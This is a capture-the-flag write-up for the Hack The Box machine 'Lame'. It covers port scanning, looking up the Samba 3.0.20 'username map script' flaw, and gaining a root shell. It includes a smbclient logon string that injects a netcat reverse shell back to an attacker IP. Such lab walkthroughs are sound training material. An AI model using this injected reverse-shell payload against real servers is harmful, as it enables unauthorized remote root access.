# 🧠 Machine Name: Lame

## 📌 Overview

- **Platform:** Hack The Box
- **Difficulty:** Easy
- **OS:** Linux
- **IP:** 10.10.10.3

---

## 🎯 Objective

Root the machine and capture all flags.

---

## 🔍 Reconnaissance

### 🔹 Nmap Scan

```bash
nmap -sC -sV -oN nmap.txt 10.10.10.3
```

**Results:**

- **21/tcp**: open ftp (vsftpd 2.3.4)
- **22/tcp**: open ssh (OpenSSH 4.7p1)
- **139/tcp**: open netbios-ssn (Samba 3.0.20-Debian)
- **445/tcp**: open microsoft-ds (Samba 3.0.20-Debian)
- **3632/tcp**: open distccd (v1)

👉 Classic machine with many potential entry points. `vsftpd 2.3.4` is known for a backdoor, but usually, it's not the path here. Let's focus on **Samba**.

---

## 🌐 Enumeration

### 🔹 Samba Enumeration

Samba version is `3.0.20-Debian`. A quick search on SearchSploit reveals a famous RCE: **"username map script"**.

```bash
searchsploit samba 3.0.20
```

![](./samba_searchsploit.png)

This vulnerability allows remote attackers to execute arbitrary commands via shell metacharacters in the username.

---

## 🚨 Initial Access

### 🔹 Exploitation (Manual)

I can use MSF or do it manually. Let's go with a simple manual payload using `smbclient`.

```bash
smbclient //10.10.10.3/tmp
```

Once connected, I can try to execute a reverse shell by sending a specifically crafted username:

```bash
logon "/=`nohup nc -e /bin/bash 10.10.14.2 4444`"
```

![](./reverse_shell_wait.png)

👉 **Access Granted!** Managed to get a shell as root immediately. This vulnerability is incredibly powerful.

---

## 🧍‍♂️ Privilege Escalation

Wait... I'm already **root**?

```bash
whoami
# root
```

👉 Yes, the Samba service was running as root and the "username map script" execution leads directly to root access.

### 🔹 Flags

```bash
cat /home/makis/user.txt
cat /root/root.txt
```

![](./lame_flags.png)

---

## 🧪 Post-Exploitation

- No further escalation needed.
- Captured both flags.

---

## 🧠 Lessons Learned

- **Outdated software** is the biggest risk. Samba 3.0.20 is ancient.
- **RCE vulnerabilities** in network services usually lead to full system compromise.
- **Always check port 445** for legacy vulnerabilities on older machines.

---

## 🧰 Tools Used

- nmap
- searchsploit
- smbclient
- netcat

---

![](./lame_pwn.png)
